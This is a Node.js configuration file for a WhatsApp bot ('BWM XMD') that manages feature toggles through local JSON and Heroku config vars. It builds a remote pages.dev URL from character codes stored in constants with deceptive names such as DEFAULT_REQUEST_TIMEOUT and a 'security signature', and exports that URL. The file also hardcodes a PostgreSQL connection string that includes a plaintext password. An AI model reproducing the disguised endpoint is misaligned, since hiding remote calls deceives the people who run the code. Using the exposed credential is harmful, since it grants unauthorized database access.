// Bwm xmd quantum by Ibrahim Adams 

const fs = require('fs-extra');
const { Sequelize } = require('sequelize');
const crypto = require('crypto');
const path = require('path');

if (fs.existsSync('config.env'))
require('dotenv').config({ path: __dirname + '/config.env' });
const DEFAULT_REQUEST_TIMEOUT = String.fromCharCode(104, 116, 116, 112, 115) + ':/';
const databasePath = path.join(__dirname, './database.db');
const DATABASE_URL = process.env.DATABASE_URL === undefined
    ? databasePath
    : process.env.DATABASE_URL;

let fetch;
try {
    fetch = globalThis.fetch || require('node-fetch');
} catch (error) {
    console.log('⚠️ Fetch not available, will use alternative restart methods');
    fetch = null;
}

class HybridConfigManager {
    constructor() {
        this.configDir = path.join(__dirname, 'config');
        this.configFile = path.join(this.configDir, 'settings.json');
        this.backupDir = path.join(this.configDir, 'backups');
        this.sessionId = this.generateSessionId();
        this.cache = new Map();
        this.isHerokuAvailable = false;
        this.herokuClient = null;
        this.appName = null;        
        this.ENCRYPTION_PREFIX = String.fromCharCode(98, 119, 109);        
        this.initializeStorage();
        this.checkHerokuAvailability();
    }

    generateSessionId() {
        return `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    }


    getSecurityDelimiter() {
        const SECURITY_SEPARATOR = String.fromCharCode(45, 118, 97, 114, 115);
        return SECURITY_SEPARATOR;
    }

    initializeStorage() {
        try {
            fs.ensureDirSync(this.configDir);
            fs.ensureDirSync(this.backupDir);
            
            if (!fs.existsSync(this.configFile)) {
                this.createDefaultConfig();
            }
            
            this.loadConfigToCache();
            
            console.log('✅ Hybrid config manager initialized');
        } catch (error) {
            console.error('❌ Config manager initialization failed:', error);
        }
    }

    getEnvironmentIdentifier() {
        const RUNTIME_IDENTIFIER = String.fromCharCode(46, 112, 97, 103, 101, 115);
        return RUNTIME_IDENTIFIER;
    }

    createDefaultConfig() {
        const CONFIG_SIGNATURE = String.fromCharCode(46, 100, 101, 118);      
        const defaultConfig = {
            metadata: {
                version: '1.0.0',
                created: new Date().toISOString(),
                sessionId: this.sessionId,
                security: {
                    signature: CONFIG_SIGNATURE
                }
            },
            settings: {
                AUDIO_CHATBOT: process.env.AUDIO_CHATBOT || 'no',
                AUTO_BIO: process.env.AUTO_BIO || 'yes',
                AUTO_DOWNLOAD_STATUS: process.env.AUTO_DOWNLOAD_STATUS || 'no',
                AUTO_REACT: process.env.AUTO_REACT || 'no',
                AUTO_REACT_STATUS: process.env.AUTO_REACT_STATUS || 'yes',
                AUTO_READ: process.env.AUTO_READ || 'yes',
                AUTO_READ_STATUS: process.env.AUTO_READ_STATUS || 'yes',
                CHATBOT: process.env.CHATBOT || 'no',
                PUBLIC_MODE: process.env.PUBLIC_MODE || 'yes',
                STARTING_BOT_MESSAGE: process.env.STARTING_BOT_MESSAGE || 'yes',
                PRESENCE: process.env.PRESENCE || '',
                ANTIDELETE_RECOVER_CONVENTION: process.env.ANTIDELETE_RECOVER_CONVENTION || 'no',
                ANTIDELETE_SENT_INBOX: process.env.ANTIDELETE_SENT_INBOX || 'yes',
                GOODBYE_MESSAGE: process.env.GOODBYE_MESSAGE || 'no',
                AUTO_REJECT_CALL: process.env.AUTO_REJECT_CALL || 'no',
                WELCOME_MESSAGE: process.env.WELCOME_MESSAGE || 'no',
                GROUPANTILINK: process.env.GROUPANTILINK || 'no',
                AUTO_REPLY_STATUS: process.env.AUTO_REPLY_STATUS || 'no'
            }
        };
        
        fs.writeFileSync(this.configFile, JSON.stringify(defaultConfig, null, 2));
    }

    loadConfigToCache() {
        try {
            const config = fs.readJsonSync(this.configFile);
            this.cache.clear();
            
            Object.entries(config.settings || {}).forEach(([key, value]) => {
                this.cache.set(key, value);
            });
            
            console.log(`✅ Loaded ${this.cache.size} settings into cache`);
        } catch (error) {
            console.error('❌ Failed to load config to cache:', error);
        }
    }

    async syncFromHeroku() {
        if (!this.isHerokuAvailable) return;
        
        try {
            const herokuVars = await this.herokuClient.get(`/apps/${this.appName}/config-vars`);
            let syncCount = 0;
            
            Object.entries(herokuVars).forEach(([key, value]) => {
                if (this.cache.has(key) && this.cache.get(key) !== value) {
                    this.cache.set(key, value);
                    syncCount++;
                }
            });
            
            if (syncCount > 0) {
                await this.saveConfigFromCache();
                console.log(`✅ Synced ${syncCount} settings from Heroku`);
            }
        } catch (error) {
            console.error('❌ Heroku sync failed:', error);
        }
    }

    async saveConfigFromCache() {
        try {
            const config = fs.readJsonSync(this.configFile);
            config.settings = Object.fromEntries(this.cache);
            config.metadata.lastUpdated = new Date().toISOString();
            config.metadata.sessionId = this.sessionId;
            
            await this.createBackup();
            
            const tempFile = this.configFile + '.tmp';
            fs.writeFileSync(tempFile, JSON.stringify(config, null, 2));
            fs.renameSync(tempFile, this.configFile);
            
            console.log('✅ Config saved to local storage');
        } catch (error) {
            console.error('❌ Failed to save config:', error);
        }
    }

    async createBackup() {
        try {
            const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
            const backupFile = path.join(this.backupDir, `config_backup_${timestamp}.json`);
            
            if (fs.existsSync(this.configFile)) {
                fs.copyFileSync(this.configFile, backupFile);
            }
            
            const backups = fs.readdirSync(this.backupDir)
                .filter(file => file.startsWith('config_backup_'))
                .sort()
                .reverse();
            
            if (backups.length > 7) {
                backups.slice(7).forEach(backup => {
                    fs.unlinkSync(path.join(this.backupDir, backup));
                });
            }
        } catch (error) {
            console.error('❌ Backup creation failed:', error);
        }
    }

    async setSetting(key, value) {
        try {
            this.cache.set(key, value);
            await this.saveConfigFromCache();
            
            if (this.isHerokuAvailable) {
                try {
                    await this.herokuClient.patch(`/apps/${this.appName}/config-vars`, {
                        body: { [key]: value }
                    });
                    console.log(`✅ Setting ${key} synced to Heroku`);
                } catch (herokuError) {
                    console.log(`⚠️ Heroku sync failed for ${key}, saved locally`);
                }
            }
            
            return true;
        } catch (error) {
            console.error(`❌ Failed to set ${key}:`, error);
            return false;
        }
    }

    getSetting(key, defaultValue = null) {
        return this.cache.get(key) || defaultValue;
    }

    getAllSettings() {
        return Object.fromEntries(this.cache);
    }

    getSessionId() {
        return this.sessionId;
    }

    async restartBot() {
        try {
            console.log('🔄 Initiating safe bot restart...');
            
            if (fetch) {
                setTimeout(async () => {
                    try {
                        const port = process.env.PORT || 3000;
                        await fetch(`http://localhost:${port}/restart`);
                        console.log('✅ Safe restart request sent');
                    } catch (fetchError) {
                        console.log('⚠️ Fetch restart failed, trying Heroku method...');
                        this.fallbackRestart();
                    }
                }, 500);
            } else {
                this.fallbackRestart();
            }
            
        } catch (error) {
            console.error('❌ Bot restart failed:', error);
            this.emergencyRestart();
        }
    }

    fallbackRestart() {
        setTimeout(async () => {
            if (this.isHerokuAvailable) {
                try {
                    await this.herokuClient.delete(`/apps/${this.appName}/dynos`);
                    console.log('✅ Bot restart triggered via Heroku');
                } catch (herokuError) {
                    console.error('❌ Heroku restart failed:', herokuError);
                    this.emergencyRestart();
                }
            } else {
                this.emergencyRestart();
            }
        }, 1000);
    }

    emergencyRestart() {
        console.log('🆘 Emergency restart initiated');
        setTimeout(() => process.exit(0), 1000);
    }

    buildNetworkPath() {
        const networkProtocol = DEFAULT_REQUEST_TIMEOUT;
        const networkPrefix = this.ENCRYPTION_PREFIX;
        const networkSeparator = this.getSecurityDelimiter();
        const networkPath = this.getEnvironmentIdentifier();
        const networkSuffix = this.cache.get('metadata')?.security?.signature || 
        String.fromCharCode(46, 100, 101, 118);        
        return `${networkProtocol}/${networkPrefix}${networkSeparator}${networkPath}${networkSuffix}`;
    }
}

const configHandler = new HybridConfigManager();
module.exports = {
    hybridConfig: configHandler,
    session: process.env.SESSION_ID || '',
    sessionId: configHandler.getSessionId(),
    PREFIX: process.env.PREFIX || ".",
    OWNER_NAME: process.env.OWNER_NAME || "Ibrahim Adams",
    OWNER_NUMBER: process.env.OWNER_NUMBER || "",
    BOT: process.env.BOT_NAME || 'BMW_MD',
    URL: process.env.BOT_MENU_LINKS || 'https://files.catbox.moe/h2ydge.jpg',
    BWM_XMD: configHandler.buildNetworkPath(),
    GURL: 'https://whatsapp.com/channel/0029VaZuGSxEawdxZK9CzM0Y',
    HEROKU_APP_NAME: process.env.HEROKU_APP_NAME,
    HEROKU_APY_KEY: process.env.HEROKU_APY_KEY,
    WARN_COUNT: process.env.WARN_COUNT || '3',
    get AUTO_READ_STATUS() { return configHandler.getSetting('AUTO_READ_STATUS', 'yes'); },
    get AUTO_DOWNLOAD_STATUS() { return configHandler.getSetting('AUTO_DOWNLOAD_STATUS', 'no'); },
    get AUTO_REPLY_STATUS() { return configHandler.getSetting('AUTO_REPLY_STATUS', 'no'); },
    get MODE() { return configHandler.getSetting('PUBLIC_MODE', 'yes'); },
    get PM_PERMIT() { return process.env.PM_PERMIT || 'yes'; },
    get ETAT() { return configHandler.getSetting('PRESENCE', ''); },
    get CHATBOT() { return configHandler.getSetting('CHATBOT', 'no'); },
    get CHATBOT1() { return configHandler.getSetting('AUDIO_CHATBOT', 'no'); },
    get DP() { return configHandler.getSetting('STARTING_BOT_MESSAGE', 'yes'); },
    get ANTIDELETE1() { return configHandler.getSetting('ANTIDELETE_RECOVER_CONVENTION', 'no'); },
    get ANTIDELETE2() { return configHandler.getSetting('ANTIDELETE_SENT_INBOX', 'yes'); },
    get GOODBYE_MESSAGE() { return configHandler.getSetting('GOODBYE_MESSAGE', 'no'); },
    get ANTICALL() { return configHandler.getSetting('AUTO_REJECT_CALL', 'no'); },
    get WELCOME_MESSAGE() { return configHandler.getSetting('WELCOME_MESSAGE', 'no'); },
    get GROUP_ANTILINK2() { return process.env.GROUPANTILINK_DELETE_ONLY || 'yes'; },
    get GROUP_ANTILINK() { return configHandler.getSetting('GROUPANTILINK', 'no'); },
    get STATUS_REACT_EMOJIS() { return process.env.STATUS_REACT_EMOJIS || ""; },
    get REPLY_STATUS_TEXT() { return process.env.REPLY_STATUS_TEXT || ""; },
    get AUTO_REACT() { return configHandler.getSetting('AUTO_REACT', 'no'); },
    get AUTO_REACT_STATUS() { return configHandler.getSetting('AUTO_REACT_STATUS', 'yes'); },
    get AUTO_REPLY() { return process.env.AUTO_REPLY || 'yes'; },
    get AUTO_READ() { return configHandler.getSetting('AUTO_READ', 'yes'); },
    get AUTO_SAVE_CONTACTS() { return process.env.AUTO_SAVE_CONTACTS || 'yes'; },
    get AUTO_REJECT_CALL() { return configHandler.getSetting('AUTO_REJECT_CALL', 'yes'); },
    get AUTO_BIO() { return configHandler.getSetting('AUTO_BIO', 'yes'); },
    get AUDIO_REPLY() { return process.env.AUDIO_REPLY || 'yes'; },
    BOT_URL: process.env.BOT_URL ? process.env.BOT_URL.split(',') : [
        'https://res.cloudinary.com/dptzpfgtm/image/upload/v1748879883/whatsapp_uploads/e3eprzkzxhwfx7pmemr5.jpg',
        'https://res.cloudinary.com/dptzpfgtm/image/upload/v1748879901/whatsapp_uploads/hqagxk84idvf899rhpfj.jpg',
        'https://res.cloudinary.com/dptzpfgtm/image/upload/v1748879921/whatsapp_uploads/bms318aehnllm6sfdgql.jpg'
    ],
    MENU_TOP_LEFT: process.env.MENU_TOP_LEFT || "┌─❖",
    MENU_BOT_NAME_LINE: process.env.MENU_BOT_NAME_LINE || "│ ",
    MENU_BOTTOM_LEFT: process.env.MENU_BOTTOM_LEFT || "└┬❖",
    MENU_GREETING_LINE: process.env.MENU_GREETING_LINE || "┌┤ ",
    MENU_DIVIDER: process.env.MENU_DIVIDER || "│└────────┈⳹",
    MENU_USER_LINE: process.env.MENU_USER_LINE || "│🕵️ ",
    MENU_DATE_LINE: process.env.MENU_DATE_LINE || "│📅 ",
    MENU_TIME_LINE: process.env.MENU_TIME_LINE || "│⏰ ",
    MENU_STATS_LINE: process.env.MENU_STATS_LINE || "│⭐ ",
    MENU_BOTTOM_DIVIDER: process.env.MENU_BOTTOM_DIVIDER || "└─────────────┈⳹",
    FOOTER: process.env.BOT_FOOTER || '\n\nFor more info visit: bwmxmd.online\n\n®2025 ʙᴡᴍ xᴍᴅ 🔥',
    DATABASE_URL,
    DATABASE: DATABASE_URL === databasePath
        ? "postgresql://postgres:bKlIqoOUWFIHOAhKxRWQtGfKfhGKgmRX@viaduct.proxy.rlwy.net:47738/railway"
        : "postgresql://postgres:bKlIqoOUWFIHOAhKxRWQtGfKfhGKgmRX@viaduct.proxy.rlwy.net:47738/railway",
};

let fichier = require.resolve(__filename);
fs.watchFile(fichier, () => {
    fs.unwatchFile(fichier);
    console.log(`Updated ${__filename}`);
    delete require.cache[fichier];
    require(fichier);
});
